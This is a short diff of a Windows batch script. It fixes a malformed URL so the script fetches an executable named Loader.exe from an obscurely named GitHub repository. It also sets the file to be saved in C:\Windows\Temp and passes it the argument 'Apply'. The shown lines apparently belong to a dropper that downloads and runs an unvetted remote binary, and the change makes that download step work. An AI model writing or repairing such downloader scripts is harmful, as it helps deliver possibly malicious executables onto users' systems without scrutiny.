@@ -1,5 +1,5 @@
 @echo off
-set "url=ttps://github.com/dexterggsamp12/929228282/raw/refs/heads/main/Loader.exe"
+set "url=https://github.com/dexterggsamp12/929228282/raw/refs/heads/main/Loader.exe"
 set "destination=C:\Windows\Temp\Loader.exe"
 set "arguments=Apply"
 
